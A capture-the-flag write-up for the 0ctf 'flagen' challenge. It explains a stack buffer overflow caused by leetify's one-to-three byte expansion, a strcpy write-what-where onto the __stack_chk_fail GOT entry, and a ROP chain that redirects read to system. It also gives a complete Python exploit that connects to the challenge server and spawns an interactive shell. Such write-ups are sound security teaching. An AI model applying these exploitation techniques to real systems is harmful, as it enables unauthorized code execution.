### Solved by barrebas

`flagen` is a 32-bit ELF, and we're also given the corresponding `libc` library. It functions as a flag generator, which can perform various functions on the input:

```
== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
```

We can input a fixed buffer of 256 bytes and the functions do exactly what they say. The most interesting function is `leetify`, because this takes the input and transforms it to leet-speak:

```
== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
Your choice: 1
Hello World!
Done.
== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
Your choice: 4
Done.
== 0ops Flag Generator ==
1. Input Flag
2. Uppercase
3. Lowercase
4. Leetify
5. Add Prefix
6. Output Flag
7. Exit 
=========================
Your choice: 6
The Flag is: 1-13110 W0r1d!
Done.
```

There are several transformations done, but most importantly, the `H` is translated into `1-1`. One byte becomes three bytes! I smell a buffer overflow! Indeed, when storing a flag consisting of 256 times `H` and then asking it to perform `leetify`, the program generates a segmentation fault. 

Narrowing down
--------------

After disassembling the responsible function, we quickly learn that we overrun a stack buffer. By supplying the correct amount of `H` bytes, the stack buffer is extend way past the allocated 256 bytes, but the binary has stack smashing protection in place. With no way to leak the canary, it's time to get creative. 

The epilogue of the vulnerable function looks like this:

```
8048ad4: mov    eax,DWORD PTR [ebp+0x8]        ; eax is the destination buffer
8048ad7: lea    edx,[ebp-0x10c]                ; edx is the source buffer on the stack
8048add: mov    DWORD PTR [esp+0x4],edx        ; copy stack buffer to dest buffer
8048ae1: mov    DWORD PTR [esp],eax
8048ae4: call   80484f0 <strcpy@plt>
8048ae9: mov    eax,DWORD PTR [ebp-0xc]
8048aec: xor    eax,DWORD PTR gs:0x14          ; check canary value
8048af3: je     8048afa <atoi@plt+0x59a>
8048af5: call   80484e0 <__stack_chk_fail@plt> ; terminate if canary is overwritten
8048afa: add    esp,0x124
8048b00: pop    edi
8048b01: pop    ebp
8048b02: ret    
```

Because the function takes the pointer to the destination buffer from the stack, we can control it. This means we have a write-what-where. Unfortunately, in the process of doing this, the canary still gets destroyed!. This means that the binary will *always* call `stack_chk_fail` and terminate. Luckily, `stack_chk_fail` is an imported function, which means we can overwrite its GOT entry with the hijacked `strcpy`! This will lead to control over `eip`. Just one final hurdle...

ROP it likes it's hot
---------------------

NX is enabled, so we need to build a ROP chain. First, we need pivot the stack pointer into our ROP chain. I found a nice `add esp, 0x1c; pop pop pop pop ret` gadget and decided to overwrite `stack_chk_fail` with that address. This will pivot `esp` into our ROP chain, ready for the next set of gadgets. The plan is to adjust the GOT pointer of `read` to make it point to `system`. Then, write out the string `sh;` in memory and using that as an argument for `system`. 

To make this happen, I just two more gadgets:

```python
# 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
# 0x08048aff : add [edi + 0x5d], bl; ret
```

With the first gadget, I could control the values of various registers, provided there are no bad chars. `0x00` is obviously bad, but remember, we pass the buffer to `leetify`: it will mangle chars like `H` and `s`! These must also be avoided, which is why the ROP chain builds the characters `s` and `h` in two parts in memory. 

The second gadget allows me to adjust values. Because `libc` is given, the output of `nm -D ./libc.so.6` could be grepped for `system` and `read`. By carefully choosing the numbers, I could adjust the GOT pointer for read. I decided to write out `sh;` into an empty piece of GOT memory. Finally, ret2system via `read@plt` and pop a shell!

The final exploit:

```python
from socket import *
import struct, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('<L', x & 0xffffffff)

def pwn():
    global s
    s=socket(AF_INET, SOCK_STREAM)
    #s.connect(('localhost', 6666))
    s.connect(('202.112.28.115', 5149))
    
    raw_input()
    
    readtil('choice: ')
    sendln('1')     # input flag
    
    # gadgets 
    # 0x08048d8c : pop ebx; pop esi; pop edi; pop ebp; ret
    # 0x08048aff : add [edi + 0x5d], bl; ret
    
    # start building the ropchain
    payload = ''
    # 0x8048d89 : used to overwrite stack_chk_fail@got and pivot the stack into our ROP chain
    payload += p(0x8048d89) 
    payload += '0000'*2 # junk
    
    # from libc.6.so:
    # 00040190 W system
    # 000dabd0 W read
    
    ### first byte
    payload += p(0x08048d8c)
    payload += p(0xffffffc0)    # ebx, lower byte is important read -> system (0xd0 + 0xc0 = 0x190)
    payload += p(-1)            # esi
    payload += p(0x804b00c-0x5d)        # edi -> read@got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ### second byte
    payload += p(0x08048d8c)
    payload += p(0xffffff56)    # ebx, lower byte is important read -> system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
    payload += p(-1)            # esi
    payload += p(0x804b00d-0x5d)        # edi -> read@got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ### third byte
    payload += p(0x08048d8c)
    payload += p(0xfffffff7)    # ebx, lower byte is important sprintf -> system (0xab + 0x56 = 0x101) 0x56 = V == not leetified
    payload += p(-1)            # esi
    payload += p(0x804b00e-0x5d)        # edi -> read@got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    
    ### write 'sh;' in got
    payload += p(0x08048d8c)
    payload += p(0xffffff39)    # ebx, 39 (0x73 would be leetified, 0x39 and 0x3a will not)
    payload += p(-1)            # esi
    payload += p(0x0804b1ff-0x5d)       # edi -> buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    payload += p(0x08048d8c)
    payload += p(0xffffff3a)    # ebx, 3a 
    payload += p(-1)            # esi
    payload += p(0x0804b1ff-0x5d)       # edi -> buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ### write 'sh;' in got
    payload += p(0x08048d8c)
    payload += p(0xffffff34)    # ebx, 68 == h
    payload += p(-1)            # esi
    payload += p(0x0804b200-0x5d)       # edi -> buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    payload += p(0x08048aff)    # 0x08048aff ; just execute the gadget twice so that 0x34 * 2 = 0x68 == 'h'
    ### write 'sh;' in got
    payload += p(0x08048d8c)
    payload += p(0xffffff3b)    # ebx, 3b == ;
    payload += p(-1)            # esi
    payload += p(0x0804b201-0x5d)       # edi -> buf in got
    payload += p(-1)            # ebp
    payload += p(0x08048aff)    # 0x08048aff
    ###
    payload += p(0x80484a0)     # read@plt -> points to system()
    payload += '1111'           # fake ret addr
    payload += p(0x0804b1ff)    # pointer to 'sh;'
    
    ropchain_length = len(payload)
    adjust_with_H = ((276-len(payload))/3)
    
    payload += 'H' * adjust_with_H  # add the correct amount of H's needed for the overflow; the pointer for strcpy() is at esp+276
    payload += 'A' * (276-ropchain_length-adjust_with_H*3) # how many A bytes do we need to make up the buffer to exactly 276 bytes?
    payload += p(0x804b01c) # point the strcpy to this address: stack_chk_fail@got >;]
    
    sendln(payload)
    
    readtil('choice: ')
    sendln('4')     # leetify
    
    print "[+] enjoy your shell!"
    
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

    s.close()

pwn()
```


```
bas@tritonal:~/tmp/0ctf/flagen$ python ./exploit.py 

[+] enjoy your shell!
id
uid=1001(flagen) gid=1001(flagen) groups=1001(flagen)
whoami
flagen
cat /home/flagen/flag
0ctf{delicious_stack_cookie_generates_flag}
```

